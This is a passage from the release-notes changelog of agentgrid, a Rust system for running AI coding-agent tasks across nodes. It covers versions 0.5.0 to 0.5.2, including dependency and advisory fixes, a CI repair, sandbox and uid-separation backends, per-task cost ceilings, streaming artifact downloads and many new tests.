  pinned toolchain, which is exactly the point of pinning it.

### Changed

- **Dependabot queue cleared (PR #83–#100 superseded).** All fourteen
  open bump PRs applied directly (the v0.5.1 convention — the queue had
  been dead weight while CI was down): cargo — async-compression 0.4.51,
  libc 0.2.191, tokio-rustls 0.26.6, tokio-util 0.7.20, sha2 0.11.1,
  thiserror 2.0.21, proptest 1.12.0, rust-embed 8.13.0, serde_json
  1.0.154; CI actions pinned to the new SHAs — upload-artifact (five
  sites), codeql-action init/analyze (plus pr-validation's upload-sarif
  for uniformity), docker/setup-qemu v4.4.0, actions/download-artifact.
  Verified: MSRV 1.94 check, clippy `-D warnings`, full workspace suite
  all green.
- **Docs:** the README build section documents the pinned toolchain and
  the enforced MSRV (the reproducibility note no longer lists the
  toolchain pin as future work); the threat model gains **T27** (the
  eval-case tamper model) and a 0.5.2 additions section covering the
  eval hash-pinning, ACP trailing-notification drain and terminal
  early-failure completions.
- **The 12k-line `tests/api.rs` monolith is now a module directory.** Same
  single integration-test binary (`tests/api/main.rs`), same 158 tests,
  byte-identical bodies — only the layout changed. The shared
  request/auth/enroll helpers (including seven late-defined ones that
  lived mid-file between tests) moved to `helpers.rs`, which re-exports
  everything a module needs via `use crate::helpers::*;`; the tests are
  grouped into domain modules (`artifacts`, `auth_approvals`, `events`,
  `lifecycle`, `misc`, `nodes`, `profiles`, `repos`, `scheduler`,
  `security`, `workflows`). Faithfulness was verified by an exact line
  partition (11 864 body lines, nothing duplicated or dropped) and a
  green 158/158 run.
- **PR validation workflow supply-chain parity.** `pr-validation.yaml`
  pinned its actions by tag (`trivy-action@master` worst of all) while
  every other workflow pins SHAs; all actions there are now commit-SHA
  pinned (reusing the SHAs already pinned elsewhere in the repo). The
  `integration-tests` job's `postgres:15-alpine` service container is
  removed — nothing in the workspace reads `DATABASE_URL` (the CP bundles
  SQLite); it was dead weight from an early template.

## [0.5.1] - 2026-10-13

### Fixed

- **CI resurrected after a month of silent death.** Since 2026-09-14 every
  CI run failed instantly with zero jobs: `ci.yml` had become unparseable
  (unquoted step `name:` values containing a colon — `smoke: binaries…`,
  three sites from the docker/tier1/arm64 commit), so GitHub created no jobs
  at all and no rust/web/e2e validation ran on any push. Fixed by quoting
  the names (found via `actionlint`, which now also runs as its own
  `.github/workflows/lint-workflows.yml` gate — a separate file, so it still
  fails loudly even if `ci.yml` itself breaks again). The first live runs
  then surfaced a month of untested rot, fixed in the same pass:
  - `ws.rs` unix-test locks (`const_new()` arity + missing `.await`) — never
    compiled on the Windows dev host (`#[cfg(all(test, unix))]`), caught by
    Linux CI on day one;
  - `run_bounded` never piped stdio: the external CTX indexer's stdout went
    to our own log and every `build()` parsed empty output (EOF) — the
    `{"body":"hi"}` was literally visible in the CI log;
  - slow-net E2E asserted contiguity over stdout-only seqs, but the task
    sequence space is shared across event types (adapter `result` at seq 202
    is legal interleaving, as `store/attempts.rs` already documents) — the
    check now asserts the true invariant (global exact range + all 200 spam
    lines by content) with full diagnostics;
  - scope-limit gate probed user-manager *reachability*, but current runners
    answer while lacking cgroup delegation (limits unenforced) — a two-step
    enforcement canary (trivial scope starts + 128M dies in a 32M scope)
    skips honestly now;
  - cluster probe demanded the version at string position 0, but the
    zeroshot stub (like every adapter binary) prints `zeroshot 0.1.0-stub`
    → node reported degraded and zeroshot E2E never started. `probe_decision`
    now matches the first digit-led token, fail-closed otherwise.
  - zeroshot kill/export ran `env_clear`-only, so the stub's state markers
    landed in the /tmp default instead of the E2E state dir: both now forward
    the attempt's operator env (the run path already did — an executor needing
    cluster credentials for kill/export was broken the same way), and the E2E
    passes its stub state via `AGENTGRID_ADAPTER_ENV`.
  - enrollment tokens are one-shot, but secure/assemble/autoassembly E2E
    started two nodes on one minted token — the second node could never
    enroll. Fresh `e2e_mint_token` per node (the run-cp-restart.sh pattern).
- **Issue #78 fixed: unsafe-libyaml gone.** `serde_yaml` 0.9 (deprecated)
  was the sole consumer of unmaintained `unsafe-libyaml` (RUSTSEC-2024-0449).
  Workflow-manifest parsing in `agentgrid-common` now uses `serde-saphyr` 1.3
  (pure Rust `#![forbid(unsafe)]`, fuzz-tested, actively maintained) — the
  swap surface was three `from_str` call sites plus the `from_yaml` error
  type; no `Value`/serialization usage existed. Parity: full workspace suite
  green (98/98 common tests incl. YAML error-message assertions), the real
  `.agentgrid/workflows/ci-fix.yaml` validates identically (4 steps), and
  serde-saphyr keeps YAML 1.1 boolean compatibility for bool fields. The
  RUSTSEC-2024-0449 ignore was removed from `deny.toml` (it would now trip
  `unused-ignored-advisory`).
- **Stale dependabot queue cleared (PR #69–77 superseded).** Nine September
  bump PRs were unmergable-stale and pinning the queue at 9/10 open:
  applied all of them directly, newer where available — `uuid` 1.26.0→1.28.0,
  `clap` 4.6.6→4.6.7, `async-compression` 0.4.47→0.4.50, `rand` 0.10.2→0.10.3,
  `clap_complete` 4.6.9→4.6.11, `opentelemetry`/`opentelemetry_sdk`/
  `opentelemetry-prometheus` 0.32.x→0.33.1 (one coordinated commit, not three
  separate PRs), `jsonwebtoken` 9.3.1→11.1.0. The jsonwebtoken major is NOT
  drop-in: v11 needs an explicit crypto backend — enabled `rust_crypto`
  (pure Rust; `aws_lc_rs` would need a C toolchain in the musl/static
  release builds). It pulls the `rsa` crate (RUSTSEC-2023-0071, unpatched):
  scoped ignore in `deny.toml` + `supply-chain.yml` — our JWT usage is
  HMAC-only (HS256, `from_secret`, default `Validation`), so the RSA timing
  path is unreachable; re-evaluate if RSA is ever configured. Full workspace
  suite green, including the `agent_session` JWT round-trip that caught the
  missing backend.
- **Supply-chain gate green again.** `cargo audit` failed on six live
  RustSec advisories in `Cargo.lock` (five `quinn-proto` 0.11.16
  RUSTSEC-2026-0338…0342 via reqwest/http3, one `rustls` 0.23.44
  RUSTSEC-2026-0285): bumped to `quinn-proto` 0.11.18 / `quinn` 0.11.12 /
  `rustls` 0.23.45. `cargo deny` failed on `unsafe-libyaml` unmaintained
  (cargo-deny 0.20 errors on in-scope unmaintained by default — the old
  "only warned" comment described a previous default): scoped ignore for
  RUSTSEC-2024-0449 only (serde_yaml 0.9 tech debt, tracked in issue #78 —
  no maintained fork drops the backend), so any *new* unmaintained crate
  still fails. Dropped the stale RUSTSEC-2024-0437 ignore from `deny.toml`
  and `supply-chain.yml` (prometheus is on protobuf 3.7.2 now).
- **Release workflow unbroken.** GitHub now auto-fails jobs using the
  deprecated `actions/cache` v4.0.0 pin ("Set up job" failure on all three
  v0.5.0 build jobs): bumped to v4.3.0. The v0.5.0 node-image build also
  raced the shared cargo-registry cache mount between the amd64/arm64 legs
  (`.cargo-ok` "File exists" under QEMU): both cache mounts are now
  `sharing=locked` in `Dockerfile.node-daemon`.

## [0.5.0] - 2026-10-12

### Added

- **Test-hygiene batch (flakes, hooks, E2E harness).** New shared
  `tests/e2e/lib-e2e.sh` (CP/node lifecycle, submit/poll/events, cleanup)
  with six scenarios migrated onto it; the pre-commit hook now syntax-checks
  staged shell scripts (`bash -n`, shellcheck best-effort) and documents
  that clippy `--all-targets` already type-checks test targets. Fixed real
  shared-state races: per-file env locks (`ws.rs` PATH, ACP drive
  PATH/HOME/`AG_FAKE_*`, git cohort/upstream/merge knobs, outbox spool
  limits, config-error streak counter shared with full-attempt tests,
  profiles/provenance env), unique temp dirs for ACP fixtures, exact-count
  isolation for the usage-counter test, and the broken
  set/restore window around `AGENTGRID_WEB_ROOT` in api tests.
- **Real cost tracking (usage in, breach out).** The adapter→node→CP→budget
  chain now carries real numbers: `adapter-mock` learned a
  `usage:<tokens>[:<cents>]` directive emitting the same `progress`
  `{tokens, cost_cents}` shape real adapters emit (stored as Metric
  events); `GET /metrics` exposes `agentgrid_llm_tokens_total` and
  `agentgrid_llm_cost_cents_total` fleet counters. E2E
  `tests/e2e/run-budget-tokens.sh` (CI): a 1000-token mock run against a
  500-token budget parks `Blocked` with a `max_tokens` breach.

- **Per-task cost ceilings.** `max_tokens` / `max_cost_cents` ride
  `CreateTaskRequest` → task row → `Assignment`; the node accumulates
  adapter-reported usage in the event sink (counted before backpressure
  drops, so a trimmed metric still counts spend) and kills the attempt with
  `error_code = "budget_exceeded"` on either ceiling — wrapper and ACP
  paths alike, with a terminal error event carrying observed totals. Zero
  is allowed (zero tolerance); unset is unbounded. CLI `ag run
  --max-tokens/--max-cost-cents`, web form fields, `TaskView` echo. E2E
  `tests/e2e/run-task-budget.sh` (CI): capped twin dies `budget_exceeded`,
  identical uncapped twin succeeds.

- **Misc batch.** `ag assemble --dry-run` prints the architect prompt plus
  the DAG-validated ephemeral template without contacting the server.
  CHANGELOG rotation: `CHANGELOG.md` keeps Unreleased plus the current
  minor line; older release notes moved to `CHANGELOG-archive.md` (release
  automation reads tag sections from the main file; archived tags shipped
  long ago).

- **Separate Unix user for attempt subprocesses (Plan 6.11).**
  `AGENTGRID_RUN_AS_USER=<user>[:<group>]` (or `<uid>[:<gid>]`) runs the
  agent as a different uid than the daemon: Docker enforces it as
  `docker run --user` (no privilege needed), the native/systemd paths wrap
  the command in `runuser -u … -- …` inside the scope. Startup validation is
  fail-closed (strict charset, `root`/`0` refused; a non-root daemon with the
  var set refuses to start rather than silently running as the daemon user).
  Operator recipe (`useradd agentgrid-worker` + `setfacl` on workspaces) and
  the threat-model delta live in ADR 0005 §8. Covered by validation/prefix
  unit tests (`run_as_spec_validation_*`, `docker_run_emits_user_*`,
  `none_prefix_wraps_runuser_*`, `systemd_prefix_wraps_runuser_inside_scope`).

- **Filesystem-compat E2E (Plan 6.13).** `tests/e2e/run-fs-compat.sh` puts the
  whole stack (CP SQLite DB+WAL, artifact root, node outbox, workspaces, repo
  mirror) on one filesystem and runs a mock happy path (contiguous events)
  plus an online backup round-trip. Wired into the CI e2e job (ext4, guards
  harness rot); xfs coverage is one manual command away
  (`AG_FS_MOUNT=/mnt/xfs`), no per-filesystem code fork (plain `write_all` +
  `fdatasync`). Matrix documented in `docs/compatibility-matrix.md`.

- **Zeroshot cluster adapter (Stage 10).** Tasks with `adapter = "zeroshot"`
  run inside a Zeroshot cluster via the new node driver
  (`crates/node-daemon/src/zeroshot.rs`): `run --id/--workdir/--role/--prompt`
  streams adapter-contract events through the existing pipeline (finalize,
  validation, artifacts all reused), `kill` runs after every cut-short or
  failed run (cancel-total, ADR 0002), `export` materializes
  `zeroshot-result.json` before finalize. Cluster id = attempt id (retry =
  new cluster by construction); missing binary →
  `infrastructure_failed:zeroshot_unavailable` (reserved name from ADR 0014).
  Workflow roles ride the assignment (`Assignment.workflow_role`, resolved
  from `role_runs`, N/N-1 safe) and map to `--role executor|verifier`.
  Security review: driver argv mounts nothing (unit-asserted), kill/export
  spawn with `env_clear`. E2E `tests/e2e/run-zeroshot.sh` with the
  contract-conformant stub `tests/e2e/zeroshot-stub.sh` (happy + failure +
  cancel-total; CI-wired; real binary via `AGENTGRID_ZEROSHOT_BIN`). Full
  contract + verified-profile recipe in ADR 0002 (now accepted).

- **CTX external indexer + on-disk index cache (Stage 11).** The node drives
  an external index binary (`AGENTGRID_CTX_BIN`: `--version` probe,
  `index --repo/--base --format json`) through a quota-bounded on-disk cache
  (`CtxCache`: atomic publish, oldest-mtime eviction, hashed key file names,
  corrupt-entry fail-safe) wrapped as `CachedProvider` — a repeat attempt on
  the same `(repo, base)` serves the warm pack with `cache_hit = true` and no
  subprocess spawn (miss/hit visible in the `context_pack` status event).
  Startup probe is informational (attempts always fall back pack-less);
  the indexer child gets a cleared env plus the operator's `CTX_*` namespace
  only (unit-asserted). E2E `tests/e2e/run-ctx.sh` with stub
  `tests/e2e/ctx-stub.sh` (fake-acp worker: cold miss + digest in the recorded
  prompt,   warm hit, exactly one index invocation; CI-wired).

- **Stage 12: Secure profile + backend spikes + two-backend workflow E2E.**
  ADR 0015 ships the Secure profile as a composition (isolated backend +
  `*-strict` task gate + autonomy ≤ l2 + uid separation + unsafe interlock),
  proven by `tests/e2e/run-secure-profile.sh` (strict task queued on a
  wrapper-only node with the visible reason, succeeded on a structured node;
  CI-wired). `ag run` gains `--security-profile` (the field previously
  existed API-only). `tests/e2e/run-workflow-backends.sh` runs one manifest
  on native then docker legs with identical step verdicts (CI docker job).
  h5i (ADR 0016) and CubeSandbox (ADR 0017) spikes conclude no-go for new
  code without binaries to evaluate, go for the existing contracts.

- **Stage 13 closers: Swarms import, context optimizer, Guild memory.**
  `agentgrid_skills::swarms_to_template` builds a DAG-validated
  `WorkflowTemplate` from dependency-aware local skills (`depends_on`
  metadata; unknown/self deps fail closed), operable via
  `ag workflows import <dir> [--create]`. The existing
  `agentgrid_common::compress` becomes the optional context optimizer
  (`AGENTGRID_CTX_BUDGET_BYTES`, off by default; `trimmed_bytes` in the
  `context_pack` event, full pack retained in cache). Guild shared memory
  ships as an operator recipe (MCP registry + per-profile subset, no code
  for the external binary). Details in ADR 0018.

- **Cross-cutting: portable CI, plan hygiene.** New `portable` CI job builds
  and tests the pure crates (`agentgrid-common`, `agentgrid-skills`) on
  `windows-latest`/`macos-latest` with no failure masking; dev-plan
  cross-cutting section updated to match reality (SBOM + provenance
  attestation + keyless cosign were already in `release.yml`). Remaining
  honest follow-ups (need live hosts/repeats, not code): p50/p95 bench
  harness, weekly two-machine happy-path runs, Gates A/B/D, final DoD.

- **Project assembly: text task → multi-host build → pushed repo.**
  New `Collector` workflow role merges upstream worker outputs into one
  commit (integrator mechanics + `git init` on plain-dir worktrees; failure
  `Blocked`s like an integrator). Run-level GitHub target
  (`github_push/repo/issue/create`) is inherited by collector steps;
  `github_create` creates a missing remote (private, no auto-init; user vs
  org endpoint by owner kind) after a `GET`-first check, and a fresh remote
  pushes without a PR (no base yet) with an explanatory event. Runs can opt
  out of the `PlanReady` human pause (`auto_approve_plan`, audited, still
  fail-closed on unparseable plans). Malformed GitHub targets 400 at task
  and run create. CLI: `ag run --github-push/--github-repo/--github-create`,
  `ag workflows run --auto-approve --github-*`. Proof:
  `tests/e2e/run-assemble.sh` (two workers on two nodes + collector merge;
  CI), client unit tests against a dummy API, scaffold/finalize tests,
  auto-approve and 400 tests. Details in ADR 0019.

- **One-button assembly: goal in, merged project out.** `POST /v1/assembly`
  builds an ephemeral architect template from a composed goal prompt and
  starts a marked run (admin-only by middleware; 400/413 on bad input).
  Plan approval appends a system collector (unless the plan names one) and
  fills blank step adapters from the run default. Auto-approved runs
  without an explicit budget get a conservative default (50 rounds, 4h).
  Entries: `ag assemble` (plus `--dry-run`: print prompt + template, no
  server round-trip), Telegram `/assemble` (trusted allowlist, merge-only,
  step-verdict report), `#/assemble` web form. Proof:
  `tests/e2e/run-autoassembly.sh` (plan-stub architect through auto-approve
  to merged patch; CI), store/API/CLI/gateway/web tests. Details in
  ADR 0020.

- **6.14 performance acceptance coverage.** 1 GiB of mock stdout
  streams through the node outbox with sublinear RAM growth
  (`spool_one_gib_stdout_without_linear_ram_growth`: 1024×1 MiB
  events, VmRSS growth < 256 MiB with ~1 GiB on disk, Linux-only).
  The 100-idle-nodes harness additionally asserts poll p99 stays flat
  near park time (no saturation collapse); server CPU in a shared
  test-process runtime is not separable, so a dedicated multi-process
  soak stays a self-hosted-nightly follow-up.

- **N / N-1 wire-contract tests (Plan 6.12 #647).**
  `crates/control-plane/tests/version_compat.rs` pins the node↔CP
  contract with hand-written JSON (not re-serialized current types):
  an N-1 minimal heartbeat is accepted and reads online with defaults,
  unknown N+1 fields are ignored (never 400), a different protocol
  major degrades the node while the heartbeat stays 200, a newer minor
  stays online, and an N-1 minimal poll is accepted with an empty batch.

- **Structured repository requirements + semver matching (Plan 6.9).**
  Repositories carry optional structured `requirements` (OS, arch,
  tools with version requirements, host memory/disk floors; migration
  0088, validated at registration with 400 on typos/absurd floors).
  Tool versions compare as real semver ranges (`*`, exact, `^`, `~`,
  `>=`/`>`/`<=`/`<`/`=`, `1.2.*`, npm-style pre-release gating —
  hand-rolled, no new dependency), wired into the capability probe
  (semver-first, legacy prefix fallback so pins like `"0."` keep
  working). The scheduler enforces `memory_mb`/`disk_mb` floors
  against reported host memory/disk with visible eligibility reasons;
  `ag repo add --requirements '<json>'` sets them, the web UI shows a
  one-line summary per repo. Covered by matcher/probe unit tests,
  registry round-trip + 400 tests, and a scheduler floor-gate test.

- **Event tail mode for fast Task details (Plan 6.7 #579).**
  `GET /v1/tasks/{id}/events?tail=N` serves the last N events ascending
  (no cursor walk; clamped to 2000, forward cursors win). The web UI
  Task-details view opens on the 500-event tail and resumes the live
  stream from its max cursor, so long histories paint fast. Covered by
  `get_events_tail_serves_last_n_ascending` (store),
  `events_tail_query_serves_last_n` (API) and a vitest URL-builder
  test.

- **100-idle-nodes heartbeat/poll load test (Plan 6.5).** A new
  `idle_nodes_heartbeat_poll_load` harness parks 100 nodes with zero
  tasks and hammers the two hot paths an idle fleet hits
  (`POST /v1/node/heartbeat`, `POST /v1/node/poll`): 2000 requests,
  zero errors, 100/100 online, zero SQLite write-lock failures
  (measured locally: 13s wall, hb p50 7ms, poll p50 ~1s park).
  `AG_LOAD_IDLE=1 bash tests/e2e/run-load.sh` runs it (wired into the
  CI failinject job); `AG_LOAD_IDLE_NODES/ROUNDS` tune the scale.
  Empty polls park for the full long-poll timeout, so the test shrinks
  it via the new `AGENTGRID_POLL_TIMEOUT_SECS` override (default 25s,
  clamped to the plan's 1..=60s range).

- **RSS budget gate on release binaries (Plan 6.3 #532).**
  The existing `tests/e2e/run-rss-budget.sh` gate (idle CP ≤ 64 MiB,
  idle node ≤ 25 MiB, streaming node ≤ 60 MiB) is now also wired into
  `release.yml` for runner-arch targets via `AG_BIN_DIR`, so the
  budgets are enforced on the numbers that matter (release), not just
  in CI on debug builds.
- **Per-attempt child peak RSS (Plan 6.3 #534).** The node samples
  `RUSAGE_CHILDREN` before spawn and after reap on both the wrapper and
  ACP paths and emits a `resource_usage` status event
  (`child_peak_rss_kb`, growth) plus a daemon log line — daemon RSS was
  already in the heartbeat as `active_rss_mib`, now the agent/build side
  is visible too (approximate under `max_concurrency > 1`, documented
  in the payload).

- **Tier-1 clean-host smoke (Plan 6.1/6.2 #504 + #515).**
  `tests/e2e/run-clean-host.sh` (CI job `tier1-clean-host`, nightly +
  manual) runs the static musl stack inside `debian:12-slim` with only
  git + ca-certificates + curl: it asserts docker/podman/node/python/
  java are absent, talks to the control plane by hostname (musl
  resolver, twice — node and `ag`), runs the full credential flow
  (setup-token bootstrap → login → enrollment → bearer loop) and a mock
  task to `succeeded`, then restarts the node with a dead
  `AGENTGRID_PROXY_URLS` entry and asserts proxy rotation + direct
  fallback. TLS identity uses bundled webpki roots by construction
  (reqwest `rustls-tls`, no system-CA dependency); pool semantics stay
  unit-tested, live forward-proxy success needs a network-calling
  adapter (follow-up).

- **`--version` on every shipped binary (Plan 5.3 #391).**
  `adapter-mock` was the last binary without it — now it prints
  `adapter-mock <version>` like the other wrappers (the node capability
  probe calls `--version` on every adapter binary each heartbeat). The
  release smoke test no longer skips it. Per-PR coverage:
  `adapters/tests/version.rs` runs `--version` on all six wrappers
  (exit 0 + version token, 30s hang-guard) and `ag` asserts clap's
  `DisplayVersion` carries the crate version.

- **CLI + web-UI contract parity E2E (Plan 4.4).**
  `tests/e2e/run-ui-cli-parity.sh` drives the same happy-path scenario
  (run → logs → succeeded → artifact, cancel → retry) through both
  operator interfaces: the `ag` CLI binary (`run`/`show`/`logs`/`cancel`/
  `retry`) and the exact HTTP sequence the React web UI uses
  (`POST /v1/tasks`, `GET` task/events, `GET events/stream` SSE,
  `GET` artifact, `POST` cancel/retry). A headless browser stays out of
  scope — the UI is a thin client over these endpoints. Wired into the
  CI e2e job; `PYTHON3` overrides the JSON helper binary.

- **Real-key Claude mini-repo integration test (Plan 3.2 #282).**
  `crates/adapters/tests/real_claude.rs` drives the real
  `adapter-claude` wrapper + Claude Code CLI against a throwaway git
  repo: prompt → file on disk → `result` event, asserting exit 0, the
  created file's content, and the result event line. Gated twice —
  `#[ignore]` plus `ANTHROPIC_API_KEY` in the environment (a real LLM
  call costs money); without the key/binary it reports a skip instead
  of failing. `AGENTGRID_UNSAFE_UNATTENDED=1` is set on the child
  process only, inside the temp repo.

- **Submodules initialized, never silently hollow (Plan 2.5).** After
  the worktree is added, `prepare_workspace` runs `git submodule update
  --init --recursive`: a repository with submodules lands with content,
  and when initialization fails (no network in the sandbox, dead URL)
  the prepare fails closed with a clear error naming submodules instead
  of handing the agent empty directories. Covered by
  `prepare_initializes_local_submodule` and
  `prepare_fails_closed_on_unreachable_submodule`.

- **Per-repository attach states (Plan 2.5 #204).** The node tracks each
  mirror as `cloning` → `ready` | `invalid` (+ error text, capped at 500
  chars) and reports the picture in every heartbeat; the control plane
  persists it (`nodes.repo_states` JSON column, migration 0087) and
  surfaces it in `NodeView` (`GET /v1/nodes`, `GET /v1/nodes/{id}`), so
  operators can see which repositories are actually usable on a node
  instead of guessing from failed attempts. `ag nodes list` gains a
  `REPOS` column (`ready/total`, `!` when any repo is cloning/invalid).
  Covered by `repo_attach_snapshot_round_trips_and_truncates`,
  `prepare_records_repo_attach_ready_and_invalid` and
  `heartbeat_persists_repo_attach_states`.

- **Local-path repository sources validated up front (Plan 2.5).** A
  `git_url` that is a local filesystem path (no `://` scheme, not
  scp-like) is now validated before any clone: the path must be a git
  repository and must carry the requested default branch, otherwise
  `prepare_workspace` fails closed with a clear error (`not a git
  repository` / `has no branch`) instead of a generic git failure deep
  inside `clone --mirror`. Non-local URLs and not-yet-existing paths
  skip validation and reach git unchanged. Covered by
  `local_path_validates_repo_and_branch` and `scp_like_detection`.

- **Fetch cohort: one bulk fetch per starting task group (Plan 6.8).**
  Concurrently starting tasks of one mirror used to serialize N identical
  `git fetch origin --prune` runs behind the repo lock (a 4-worker
  parallel step fetched 4 times in a row). Now the first prepare becomes
  the cohort leader and performs the fetch; prepares arriving while it is
  in flight wait on its outcome and skip their own, and a prepare landing
  within `AGENTGRID_FETCH_COHORT_SECS` (default 30s, 0 disables) of a
  successful fetch skips the bulk refresh too. The leader failure path
  falls back to an own fetch (pre-cohort behavior), a dropped leader
  unblocks followers via a Drop guard, and point-fetches for pinned
  `base_commit` / upstream SHAs always run (per-attempt correctness, never
  coalesced). Cohort waits feed the existing `repo_lock_wait_ms`
  contention metric. Covered by
  `fetch_cohort_single_flight_shares_outcome`,
  `fetch_cohort_leader_failure_unblocks_followers`,
  `fetch_cohort_window_zero_disables_freshness`,
  `fetch_cohort_concurrent_prepares_share_one_fetch` (3 workers, 0 bulk
  fetches during the burst) and
  `fetch_cohort_fresh_window_skips_then_refetches`.

- **zstd-compressed log artifacts on disk (Plan 6.7).** Log-class
  artifact uploads (`.log` names or `text/*` media types, ≥ 4 KiB) whose
  content compresses by at least 30% are stored as `<name>.zst` on the
  control-plane disk (row-flagged, migration 0086); patches, binaries and
  incompressible logs keep the plain shape. `size_bytes` stays the logical
  uncompressed length every API already reports, downloads decode the
  zstd frame on the wire (streamed, never in RAM whole), and the
  in-memory read paths decode transparently. Retention unlinks both
  shapes; `storage_reconcile` sees through the `.zst` suffix so a
  compressed backing file is never misread as an orphan. Range requests
  against a compressed body answer a full 200 (RFC 9110 lets a server
  ignore a Range it cannot honor; random access into a zstd frame would
  need a seek-table we don't write). Covered by
  `log_artifact_stored_zstd_but_serves_logical_bytes`,
  `plain_artifact_stays_uncompressed`,
  `compressed_artifact_decodes_on_the_wire`,
  `compressed_artifact_ignores_range`,
  `compress_if_worthwhile_floor_and_win`.

- **Range-aware streaming artifact downloads (Plan 6.7).**
  `GET /v1/tasks/{id}/artifacts/{name}` (and the node-credential mirror
  `/v1/node/tasks/{id}/artifacts/{name}`) no longer reads the artifact into
  RAM — the response is a bounded 64 KiB-chunk file stream, so a 1 GiB
  `agent-raw-output.log` serves at flat memory cost. Single-range `Range`
  headers are honored: `bytes=a-b` / `bytes=a-` / `bytes=-n` → 206 +
  `Content-Range`, unsatisfiable → 416 + `bytes */len` (RFC 9110);
  multi-range / non-`bytes` / garbage specs fall back to a full 200
  stream. Every response advertises `Accept-Ranges: bytes`. The pure
  parser (`parse_single_range`) and the 206/416/208 slice semantics are
  unit-tested; an API-level integration test proves upload → Range GET
  round-trips exact slices.

- **Systemd transient-scope sandbox backend (Plan 6.11).**
  `AGENTGRID_SANDBOX=systemd` runs each attempt inside a
  `systemd-run --user --scope --unit agentgrid-scope-<attempt>` transient
  scope — the whole agent tree lands in one cgroup, and the kernel enforces
  `MemoryMax` / `CPUQuota` / `TasksMax` (per-attempt profile limits override
  the `AGENTGRID_SANDBOX_MEMORY` / `_CPUS` / `_PIDS_LIMIT` env knobs, same
  precedence as the docker path). No container runtime required — the
  native Tier-1 isolation backend. Cancel/timeout kills the entire scope
  (`systemctl --user kill` + `stop`, replacing a docker-only teardown), a
  memory.max breach is detected post-exit (`systemctl --user show -p
  OOMKill`) and completes with `error_code=resource_limit:memory`, and the
  startup sweep stops leftover `agentgrid-scope-*` units after a daemon
  crash. The heartbeat advertises `systemd_scope_supported` (migration
  0085, `agentgrid_node_systemd_scope` metric) so the UI/eligibility can
  distinguish "scope backend configured" from "scope backend available";
  `install-node.sh` now runs `loginctl enable-linger` so the agentgrid
  user's manager exists for headless services. New mock `fork:<n>` command
  (spawns n concurrent children) makes TasksMax observable; E2E
  `tests/e2e/run-scope-limit.sh` proves MemoryMax → OOM →
  `resource_limit` and TasksMax → fork refusal → `failed` on any systemd
  host (skips cleanly where no user manager answers, including GitHub
  runners).

- **Resource reservations + pressure hysteresis (Plan 6.10).** Nodes now
  report `free_memory_mb` (MemAvailable minus the operator-reserved
  slice, `AGENTGRID_RESERVED_MEM_MB`, default 256 MiB) and `cpu_count`;
  the scheduler refuses new work when free memory drops below
  `AGENTGRID_MIN_FREE_MEM_MB`, disk below
  `AGENTGRID_MIN_FREE_DISK_MB` (node-side degraded floor:
  `AGENTGRID_MIN_FREE_DISK_MB`, default 5120), or load per CPU above
  `AGENTGRID_MAX_LOAD_PER_CPU` (default 2.0). Sustained pressure
  degrades a node only after 3 consecutive bad beats and requires 5
  good beats to come back (`PressureState`, unit-tested: no single
  load-spike flapping); a near-ENOSPC disk still degrades instantly.
  The eligibility endpoint surfaces the same reasons ("low host
  memory", "high load", …). Migrations 0083/0084; store tests
  `reserved_free_memory_gates_assignment`,
  `high_load_per_cpu_blocks_assignment`,
  `eligibility_reports_resource_pressure_reasons`.
- **Tokio topology caps (Plan 6.4).** Node daemon and control plane
  build explicit multi-thread runtimes with bounded worker/blocking
  pools (node 2/8, CP 4/32) to keep the idle footprint within the RSS
  budgets; operators override via `AGENTGRID_TOKIO_WORKERS` /
  `AGENTGRID_TOKIO_BLOCKING`.
- **Response compression above 8 KiB (Plan 6.6).** The control plane
  brotli-compresses large responses (event listings, task details)
  when the client offers `Accept-Encoding`; small JSON skips the CPU
  cost (`SizeAbove::new(8 KiB)`). Test:
  `compression_kicks_in_above_8kib`.
- **Git LFS / submodules capabilities (Plan 6.8).** The heartbeat
  publishes `git_lfs_installed` (bounded `git-lfs version` probe) and
  `git_submodules_supported`, so LFS-enabled repos on LFS-less nodes
  are visible instead of silently yielding pointer files.
- **Binary-size tracking in release CI (Plan 6.2).** Release builds
  record per-target binary sizes against a cached baseline
  (`actions/cache`) and print the delta into the build summary — size
  regressions surface at review time, not only at the 60 MiB guardrail.
- **Node version reporting (Plan 6.12).** The daemon's
  `agent_version` heartbeat field now defaults to the real
  `CARGO_PKG_VERSION` (was a hardcoded "0.1.0-dev"); override stays
  `AGENTGRID_AGENT_VERSION`.
- **`GET /v1/version` (public) + heartbeat contract versions (Plan 6.12).**
  The new endpoint reports the CP crate version plus the node-facing
  contract versions (`node_protocol`, `capabilities_schema`,
  `supported_event_versions`); nodes advertise
  `capabilities_schema_version` / `supported_event_versions` in each
  heartbeat (absent on legacy nodes, never a gate — observability for
  rolling upgrades). `ag doctor` now prints the server version line
  instead of a reserved-null field. Covered by
  `version_endpoint_reports_contracts` (api) + the openapi contract
  test.
- **Heartbeat jitter (Plan 6.10).** The node's heartbeat interval is
  jittered ±20% (deterministic xorshift roll, `jittered_interval` is
  pure and unit-tested: band/staleness/garbage-roll/variance) so a fleet
  restarted together does not synchronize beats into a thundering herd
  against the CP. Worst case (10s base +20% = 12s) stays far under the
  30s node-staleness window. `AGENTGRID_HEARTBEAT_NO_JITTER=1` restores
  the fixed cadence for debugging.
- **Windows dev-host support restored (regression from 0.3.x).** The
  workspace compiles and the full test suite runs natively on Windows:
  unix-only code paths (flock, killpg/waitpid, process groups, statvfs,
  getuid, mode bits) are `#[cfg(unix)]`-gated with documented
  degradations; `resolve_in_path` also probes the `.exe` form (the raw
  `is_file` check missed every adapter on Windows);
  `validate_git_url` accepts drive-letter local paths on Windows while
  keeping the full metachar reject list; `safe_workspace_target` no
  longer rejects absolute Windows paths (Prefix components) — only
  `..` and symlinks remain the traversal vectors. Git tests run with a
  hermetic empty `GIT_CONFIG_SYSTEM`/`GIT_CONFIG_GLOBAL` so a host's
  `core.autocrlf=true` (the git-for-Windows installer default) cannot
  corrupt byte-exact patch/merge assertions; unix-shell tests are
  `#[cfg(unix)]`.
- **`ag` categorized exit codes (Plan 1.10 #3).** Failures no longer
  flatten to exit 1: 3 auth (401/403), 4 not found, 5 CP unreachable
  (connect/timeout), 6 rejected (409/422), 7 rate-limited (429), 10
  5xx — the classifier walks the anyhow chain for the reqwest status.
  Documented in README ("ag exit codes"); constants unit-tested for
  distinctness.
- **Claude adapter failure classification (Plan 3.5 #13).** A failed
  `claude -p` result line now also emits a classified `error` event
  (`subtype: rate_limited | auth_failed | billing_exhausted |
  network_error`) via the pure `classify_error` matcher, so failure
  causes are visible in the task event trail without parsing prose.
  Unknown text keeps the plain result event (no behaviour change).
- **CI: docker-image build job + Tier-1 distro matrix + ARM64 QEMU
